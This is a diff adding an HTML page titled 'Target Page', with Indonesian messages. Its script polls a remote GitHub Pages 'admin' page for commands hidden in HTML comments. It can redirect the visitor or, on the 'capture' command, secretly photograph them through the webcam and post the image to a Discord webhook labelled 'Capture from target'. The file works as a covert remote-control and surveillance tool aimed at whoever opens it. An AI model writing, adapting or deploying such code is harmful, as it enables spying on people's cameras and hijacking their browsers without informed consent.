@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Target Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: white;
+            transition: background 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <h1>Target Page</h1>
+    <p id="message">Menunggu perintah...</p>
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    
+    <script>
+        async function checkCommand() {
+            try {
+                let response = await fetch('https://your-admin-repo.github.io/admin.html');
+                let text = await response.text();
+                let match = text.match(/<!--COMMAND:(.*?)-->/);
+                
+                if (match) {
+                    let command = match[1];
+                    document.getElementById("message").innerText = "Pesan: " + command;
+                    
+                    if (command.startsWith("redirect:")) {
+                        window.location.href = command.replace("redirect:", "");
+                    } else if (command.startsWith("bgcolor:")) {
+                        document.body.style.backgroundColor = command.replace("bgcolor:", "");
+                    } else if (command === "capture") {
+                        captureAndSend();
+                    }
+                }
+            } catch (error) {
+                console.error("Gagal mengambil perintah", error);
+            }
+        }
+        setInterval(checkCommand, 3000);
+        
+        async function captureAndSend() {
+            let video = document.getElementById("video");
+            let canvas = document.getElementById("canvas");
+            let ctx = canvas.getContext("2d");
+            
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0);
+                        stream.getTracks().forEach(track => track.stop());
+                        sendToDiscord(canvas.toDataURL("image/png"));
+                    }, 2000);
+                })
+                .catch(err => console.error("Gagal mengakses kamera", err));
+        }
+        
+        async function sendToDiscord(imageData) {
+            let webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
+            let payload = { content: "📸 Capture from target", files: [{ attachment: imageData, name: "capture.png" }] };
+            
+            fetch(webhookURL, {
+                method: "POST",
+                body: JSON.stringify(payload),
+                headers: { "Content-Type": "application/json" }
+            }).catch(err => console.error("Gagal mengirim ke Discord", err));
+        }
+    </script>
+</body>
+</html>
